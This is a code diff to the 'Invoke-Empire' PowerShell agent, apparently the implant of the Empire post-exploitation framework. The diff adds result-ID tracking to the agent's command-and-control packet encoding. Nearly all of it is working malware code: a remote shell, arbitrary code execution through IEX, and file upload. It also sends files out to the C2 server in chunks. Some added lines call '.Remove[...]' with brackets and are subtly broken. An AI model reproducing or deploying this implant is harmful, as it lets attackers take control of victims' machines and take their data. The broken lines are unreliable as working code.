@@ -88,6 +88,7 @@ function Invoke-Empire {
     $script:AgentJitter = $AgentJitter
     $script:LostLimit = $LostLimit
     $script:MissedCheckins = 0
+    $script:resultIDs = @{}
     $script:DefaultPage = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($DefaultPage))
     
     $encoding = [System.Text.Encoding]::ASCII
@@ -557,7 +558,7 @@ function Invoke-Empire {
     ############################################################
 
     function Encode-Packet {
-        param([int]$type, $data)
+        param([int]$type, $data, $resultID=0)
         # encode a packet for transport
         #   format - [type][counter][length][value]
 
@@ -569,15 +570,15 @@ function Invoke-Empire {
         #convert data to base64 so we can support all encodings and handle on server side
         $data = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.getbytes($data))
 
-        $packet = New-Object Byte[] (12 + $data.Length)
+        $packet = New-Object Byte[] (16 + $data.Length)
 
         # calculate the counter = epochDiff from server + current epoch
         $counter = $($script:EpochDiff + [int][double]::Parse((Get-Date(Get-Date).ToUniversalTime()-UFormat %s))) -as [int]
-
         ([bitconverter]::GetBytes($type)).CopyTo($packet, 0)
         ([bitconverter]::GetBytes($counter)).CopyTo($packet, 4)
         ([bitconverter]::GetBytes($data.Length)).CopyTo($packet, 8)
-        ([System.Text.Encoding]::UTF8.getbytes($data)).CopyTo($packet, 12)
+	([bitconverter]::GetBytes($resultID)).CopyTo($packet, 12)
+        ([System.Text.Encoding]::UTF8.getbytes($data)).CopyTo($packet, 16)
 
         $packet
     }
@@ -591,12 +592,13 @@ function Invoke-Empire {
         $type = [bitconverter]::ToUInt32($packet, 0+$offset)
         $counter = [bitconverter]::ToUInt32($packet, 4+$offset)
         $length = [bitconverter]::ToUInt32($packet, 8+$offset)
-        $data = [System.Text.Encoding]::UTF8.GetString($packet[(12+$offset)..(12+$length+$offset-1)])
-        $remaining = [System.Text.Encoding]::UTF8.GetString($packet[(12+$length+$offset)..($packet.Length)])
+	$resultID = [bitconverter]::ToUInt32($packet, 12+$offset)
+        $data = [System.Text.Encoding]::UTF8.GetString($packet[(16+$offset)..(16+$length+$offset-1)])
+        $remaining = [System.Text.Encoding]::UTF8.GetString($packet[(16+$length+$offset)..($packet.Length)])
 
         Remove-Variable packet;
 
-        @($type,$counter,$length,$data,$remaining)
+        @($type,$counter,$length,$resultID,$data,$remaining)
     }
 
     # send a message to the current C2 server
@@ -634,36 +636,35 @@ function Invoke-Empire {
 
     # process a single packet extracted from a tasking
     function Process-Packet {
-        param($type, $msg)
+        param($type, $msg, $resultID)
 
         try {
 
             # sysinfo request
             if($type -eq 1){
-                return Encode-Packet -type $type -data $(Get-Sysinfo)
+                return Encode-Packet -type $type -data $(Get-Sysinfo) -resultID $resultID
             }
             # agent exit
             elseif($type -eq 2){
                 $msg = "[!] Agent "+$script:SessionID+" exiting"
                 # this is the only time we send a message out of the normal process,
                 #   because we're exited immediately after
-                Send-Message $(Encode-Packet -type $type -data $msg)
+                Send-Message $(Encode-Packet -type $type -data $msg -resultID $resultID)
                 exit
             }
             # shell command
             elseif($type -eq 40){
                 $parts = $data.Split(" ")
-
                 # if the command has no arguments
                 if($parts.Length -eq 1){
                     $cmd = $parts[0]
-                    Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd) -join "`n").trim()
+                    Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd) -join "`n").trim() -resultID $resultID
                 }
                 # if the command has arguments
                 else{
                     $cmd = $parts[0]
                     $cmdargs = $parts[1..$parts.length] -join " "
-                    Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd -cmdargs $cmdargs) -join "`n").trim()
+                    Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd -cmdargs $cmdargs) -join "`n").trim() -resultID $resultID
                 }
             }
             # file download
@@ -710,7 +711,7 @@ function Invoke-Empire {
                         
                         if($EncodedPart){
                             $data = "{0}|{1}|{2}" -f $Index, $path, $EncodedPart
-                            Send-Message (Encode-Packet -type $type -data $($data))
+                            Send-Message (Encode-Packet -type $type -data $($data) -resultID $resultID)
                             $Index += 1
                             
                             # if there are more parts of the file, sleep for the specified interval
@@ -730,10 +731,10 @@ function Invoke-Empire {
                         [GC]::Collect()
                     } while($EncodedPart)
 
-                    Encode-Packet -type 40 -data "[*] File download of $path completed"
+                    Encode-Packet -type 40 -data "[*] File download of $path completed" -resultID $resultID
                 }
                 catch {
-                    Encode-Packet -type 0 -data "file does not exist or cannot be accessed"
+                    Encode-Packet -type 0 -data "file does not exist or cannot be accessed" -resultID $resultID
                 }
             }
             # file upload
@@ -745,16 +746,16 @@ function Invoke-Empire {
                 $Content = [System.Convert]::FromBase64String($base64part)
                 try{
                     Set-Content -Path $filename -Value $Content -Encoding Byte
-                    Encode-Packet -type $type -data "[*] Upload of $fileName successful"
+                    Encode-Packet -type $type -data "[*] Upload of $fileName successful" -resultID $resultID
                 }
                 catch {
-                    Encode-Packet -type 0 -data "[!] Error in writing file during upload"
+                    Encode-Packet -type 0 -data "[!] Error in writing file during upload"  -resultID $resultID
                 }
             }
 
             # return the currently running jobs
             elseif($type -eq 50){
-               Encode-Packet -data ((Get-Job -name ($JobNameBase + "*") | % {$_.name}) -join "`n") -type $type
+               Encode-Packet -data ((Get-Job -name ($JobNameBase + "*") | % {$_.name}) -join "`n") -type $type -resultID $resultID
             }
             # stop and remove a specific job if it's running
             elseif($type -eq 51){
@@ -769,16 +770,17 @@ function Invoke-Empire {
                         $data = $data -join ""
                     }
                     $data = $data | fl | Out-String
+                    $jobResultID = $resultIDs[$jobName]
 
                     if($data -and $($data.trim() -ne '')) {
-                        Encode-Packet -type $type -data $($data)
+                        Encode-Packet -type $type -data $($data) -resultID $jobResultID
                     }
                     Stop-Job $job
                     Remove-Job $job
-                    Encode-Packet -type 51 -data "Job $jobName killed."
+                    Encode-Packet -type 51 -data "Job $jobName killed." -resultID $resultID
                 }
                 catch {
-                    Encode-Packet -type 0 -data "error in stopping job"
+                    Encode-Packet -type 0 -data "error in stopping job" -resultID $resultID
                 }
             }
 
@@ -786,7 +788,7 @@ function Invoke-Empire {
             elseif($type -eq 100){
                 # # original method:
                 # # $null = IEX $data
-                Encode-Packet -type $type -data (IEX $data)
+                Encode-Packet -type $type -data (IEX $data) -resultID $resultID
 
                 # $ps = [PowerShell]::Create()
                 # # $runspace = [runspacefactory]::CreateRunspace()
@@ -827,12 +829,13 @@ function Invoke-Empire {
                 # $ps = $null
 
                 # send back the results
-                Encode-Packet -type $type -data ($prefix + $extension + (IEX $data))
+                Encode-Packet -type $type -data ($prefix + $extension + (IEX $data)) -resultID $resultID
             }
             # dynamic code execution, no wait, don't save output
             elseif($type -eq 110){
                 $jobID = Start-AgentJob $data
-                Encode-Packet -type $type -data ("Job started: " + $jobID)
+		$script:resultIDs[$jobID]=$resultID
+                Encode-Packet -type $type -data ("Job started: " + $jobID) -resultID $resultID
             }
             # dynamic code execution, no wait, save output
             elseif($type -eq 111){
@@ -842,14 +845,15 @@ function Invoke-Empire {
                 $data = $data.Substring(20)
 
                 $jobID = Start-AgentJob $data $prefix $extension
-                Encode-Packet -type 110 -data ("Job started: " + $jobID)
+		$script:resultIDs[$jobID] = $resultID
+                Encode-Packet -type 110 -data ("Job started: " + $jobID) -resultID $resultID
             }
 
             # import a dynamic script and save it in agent memory
             elseif($type -eq 120){
                 # encrypt the script for storage
                 $script:importedScript = Encrypt-Bytes $encoding.getbytes($data);
-                Encode-Packet -type $type -data "script successfully saved in memory"
+                Encode-Packet -type $type -data "script successfully saved in memory" -resultID $resultID
             }
             # execute a function in the currently imported script
             elseif($type -eq 121){
@@ -858,16 +862,17 @@ function Invoke-Empire {
                 $script = Decrypt-Bytes $script:importedScript
                 if ($script){
                     $jobID = Start-AgentJob ([System.Text.Encoding]::UTF8.GetString($script) + "; $data")
-                    Encode-Packet -type $type -data ("Job started: " + $jobID)
+		    $script:resultIDs[$jobID]=$resultID
+                    Encode-Packet -type $type -data ("Job started: " + $jobID) -resultID $resultID
                 }
             }
 
             else{
-                Encode-Packet -type 0 -data "invalid type: $type"
+                Encode-Packet -type 0 -data "invalid type: $type" -resultID $resultID
             }
         }
         catch [System.Exception] {
-            Encode-Packet -type $type -data "error running command: $_"
+            Encode-Packet -type $type -data "error running command: $_" -resultID $resultID
         }
     }
 
@@ -887,10 +892,11 @@ function Invoke-Empire {
         $type = $decoded[0]
         $counter = $decoded[1]
         $length = $decoded[2]
-        $data = $decoded[3]
+	$resultID = $decoded[3]
+        $data = $decoded[4]
 
         # any remaining sections of the packet
-        $remaining = $decoded[4]
+        $remaining = $decoded[5]
 
         # calculate what the server's epoch should be based on the epoch diff
         #   this is just done for the first packet in a queue
@@ -903,22 +909,23 @@ function Invoke-Empire {
         }
 
         # process the first part of the packet
-        $resultPackets = $(Process-Packet $type $data)
+        $resultPackets = $(Process-Packet $type $data $resultID)
 
-        $offset = 12 + $length
+        $offset = 16 + $length
         # process any additional packets in the tasking
         while($remaining.Length -ne 0){
             $decoded = Decode-Packet $taskingBytes $offset
             $type = $decoded[0]
             $counter = $decoded[1]
             $length = $decoded[2]
-            $data = $decoded[3]
-            $remaining = $decoded[4]
+	    $resultID = $decoded[3]
+            $data = $decoded[4]
+            $remaining = $decoded[5]
 
             # process the new sub-packet and add it to the result set
-            $resultPackets += $(Process-Packet $type $data)
+            $resultPackets += $(Process-Packet $type $data $resultID)
 
-            $offset += $(12 + $length)
+            $offset += $(16 + $length)
         }
 
         # send all the result packets back to the C2 server
@@ -977,8 +984,9 @@ function Invoke-Empire {
                 $data = $data | fl | Out-String
 
                 if($data){
-                    $packets += $(Encode-Packet -type 110 -data $($data))
+                    $packets += $(Encode-Packet -type 110 -data $($data) -resultID $resultIDs[$_])
                 }
+		$script:resultIDs.Remove($_)
                 Stop-Job $_
                 Remove-Job $_
             }
@@ -1010,8 +1018,9 @@ function Invoke-Empire {
                 $data = $data | fl | Out-String
 
                 if($data){
-                    $packets += $(Encode-Packet -type 110 -data $($data))
+                    $packets += $(Encode-Packet -type 110 -data $($data) -resultID $resultIDs[$_])
                 }
+		$script:resultIDs.Remove[$_]
                 Stop-Job $_
                 Remove-Job $_
             }
@@ -1088,11 +1097,12 @@ function Invoke-Empire {
 
 
                     if($data){
-                        $encoded = Encode-Packet -type 110 -data $($data)
+                        $encoded = Encode-Packet -type 110 -data $($data) -resultID $script:resultIDs[$_.Name]
                         Send-Message $encoded
                     }
                 }
                 if($_.State -eq "Completed"){
+		    $script:resultIDs.Remove[$_.Name]
                     Remove-Job $_
                 }
             }
